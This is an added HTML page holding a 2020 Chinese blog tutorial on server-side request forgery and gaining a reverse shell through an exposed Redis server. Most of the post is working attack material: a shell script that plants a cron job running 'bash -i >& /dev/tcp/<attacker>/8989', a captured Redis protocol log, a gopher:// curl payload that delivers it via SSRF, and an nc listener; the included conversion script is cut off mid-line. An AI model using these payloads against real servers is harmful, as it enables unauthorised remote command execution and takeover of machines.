@@ -1,0 +1,452 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>SSRF在Redis中反弹shell | 开发者问答集锦</title>
+    <meta property="og:title" content="SSRF在Redis中反弹shell - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="SSRF在Redis中反弹shell">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/ssrf%E5%9C%A8redis%E4%B8%AD%E5%8F%8D%E5%BC%B9shell/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">SSRF在Redis中反弹shell</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<blockquote>
+<p>搭个环境怪不容易的，求大佬们放过。。。</p>
+</blockquote>
+
+<p>参考文献：<a href="https://joychou.org/web/phpssrf.html">https://joychou.org/web/phpssrf.html</a><br />
+<a href="https://www.anquanke.com/post/id/146417">https://www.anquanke.com/post/id/146417</a></p>
+
+<h4 id="ssrf概念">SSRF概念</h4>
+
+<p>SSRF（Server-Side Request Forgery），服务端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。</p>
+
+<h4 id="利用-ssrf-实现的攻击">利用 SSRF 实现的攻击：</h4>
+
+<blockquote>
+<p>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息<br />
+ 攻击运行在内网或本地的应用程序<br />
+ 对内网 WEB 应用进行指纹识别，通过访问默认文件实现<br />
+ 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）<br />
+ 利用 <code>file</code> 协议读取本地文件</p>
+</blockquote>
+
+<h4 id="ssrf漏洞出现的场景">SSRF漏洞出现的场景</h4>
+
+<p>常见的危险函数：</p>
+
+<pre><code> fsockopen()      file_get_contents()     curl_exec()
+</code></pre>
+
+<ul>
+<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
+<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB，Redis）</li>
+<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
+</ul>
+
+<h4 id="redis反弹shell">redis反弹shell</h4>
+
+<p><strong>环境</strong></p>
+
+<blockquote>
+<p>centos xx.xxx.xx.xxx ，目标（需以root方式启动redis）<br />
+ ubuntu xxx.xx.xxx.xx，攻击方</p>
+</blockquote>
+
+<p><strong>redis反弹shell的bash脚本</strong></p>
+
+<pre><code>#shell.sh
+echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/8989 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
+redis-cli -h $1 -p $2 config set dir /var/spool/cron/
+redis-cli -h $1 -p $2 config set dbfilename root
+redis-cli -h $1 -p $2 save
+redis-cli -h $1 -p $2 quit
+</code></pre>
+
+<p>在redis的第0个数据库中添加key为1，value为\n\n\n*/1 * * * * bash -i &gt;&amp;
+/dev/tcp/xxx.xx.xxx.xx/2333
+0&gt;&amp;1\n\n\n\n的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。<code>CONFIG SET</code> 命令动态地调整 Redis
+服务器的配置，每个用户生成的crontab文件，都会放在 /var/spool/cron/
+目录下面，<code>set</code>直接往当前用户的crontab里写入反弹shell</p>
+
+<p><strong>执行脚本命令：</strong></p>
+
+<pre><code>bash shell.sh xx.xxx.xx.xxx  6379
+</code></pre>
+
+<p>想获取Redis攻击的TCP数据包，可以使用socat进行端口转发。</p>
+
+<pre><code>socat -v tcp-listen:4444,fork tcp-connect:xx.xxx.xx.xxx :6379
+bash xx.xxx.xx.xxx shell.sh 4444
+</code></pre>
+
+<p>意思是将本机的4444端口转发到本机的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。本应在socat那个命令下捕获到数据，但是阿里云的服务器是真的强，emmm因为端口问题一直没有成功。<br />
+ <strong>这个是大佬的数据（抓不到比较难受）</strong></p>
+
+<pre><code>&gt; 2017/10/11 01:24:52.432446  length=85 from=0 to=84
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$58\r
+
+
+
+*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1
+
+
+
+\r
+&lt; 2017/10/11 01:24:52.432685  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.435153  length=57 from=0 to=56
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$16\r
+/var/spool/cron/\r
+&lt; 2017/10/11 01:24:52.435332  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.437594  length=52 from=0 to=51
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$4\r
+root\r
+&lt; 2017/10/11 01:24:52.437760  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.439943  length=14 from=0 to=13
+*1\r
+$4\r
+save\r
+&lt; 2017/10/11 01:24:52.443318  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.446034  length=14 from=0 to=13
+*1\r
+$4\r
+quit\r
+&lt; 2017/10/11 01:24:52.446148  length=5 from=0 to=4
++OK\r
+</code></pre>
+
+<p><em>引用的话还需转换：</em></p>
+
+<pre><code>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。
+如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
+将\r字符串替换成%0d%0a
+空白行替换为%0a
+</code></pre>
+
+<p>通过转换规则发现，如果要换IP和端口，前面的58表示字符串长度为58个字节，上面的EXP即是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp;
+/dev/tcp/127.0.0.1/2333
+0&gt;&amp;1%0a%0a%0a%0a</code>，3+51+4=58。如果想换成xxx.xx.xxx.xx，那么62，其他不变就行<br />
+ <strong>转换脚本</strong></p>
+
+<pre><code>python tran.py socat.log
+
+
+
+#coding: utf-8
+#author: JoyChou
+import sys
+
+exp = ''
+
+with open(sys.argv[1]) as f:
+    for line in f.readlines():
+        if line[0] in '&gt;
+</code></pre>
+
+<p>结果为：</p>
+
+<pre><code>*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/8989 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a
+</code></pre>
+
+<p><strong>执行此命令</strong></p>
+
+<pre><code>curl -v 'gopher://xx.xxx.xx.xxx
+:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/8989 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a'
+</code></pre>
+
+<p>出现5个ok，则成功了。</p>
+
+<p><strong>本地监听8989端口</strong></p>
+
+<pre><code>nc -l -p 8989
+</code></pre>
+
+<h4 id="可能出现的问题">可能出现的问题：</h4>
+
+<p>①(error) MISCONF Redis is configured to save RDB snapshots, but is currently
+not able to persist on disk. Commands that may modify the data set are
+disabled. Please check Redis logs for details about the error.<br />
+原因：强制把redis快照关闭了导致不能持久化<br />
+解决方法：127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no</p>
+
+<p>②.save Error<br />
+日志（vi /var/log/redis/redis-server.log）：Failed opening .rdb for saving: Read-
+only file system<br />
+emmm，找不到解决办法，有大佬知道的话请给我说下。</p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
